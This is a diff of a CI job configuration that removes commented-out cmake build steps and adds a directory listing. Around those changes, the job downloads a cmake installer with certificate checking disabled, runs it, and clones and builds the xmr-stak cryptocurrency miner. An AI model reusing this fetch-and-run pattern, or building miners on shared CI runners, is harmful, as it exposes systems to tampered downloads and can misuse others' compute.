@@ -6,17 +6,7 @@ bminer415/citesting:
     - wget --no-check-certificate https://cmake.org/files/v3.10/$CMAKE_FILE
     - chmod 755 $CMAKE_FILE
     - ./$CMAKE_FILE --skip-license
-    #- cd cmake-3.10.2
-    #- alias g++="g++ --std=c++11"
-    #- export CXX="$(which g++) --std=c++11"
-    #- which g++
-    #- echo "$CXX"
-    #- ./configure
-    #- make
-    #- make install
-    #- sudo add-apt-repository ppa:george-edison55/cmake-3.x
-    #- sudo apt-get update
-    #- sudo apt-get install -y cmake
+    - ls -la /build
     - git clone https://github.com/fireice-uk/xmr-stak.git
     - mkdir xmr-stak/build
     - cd xmr-stak/build
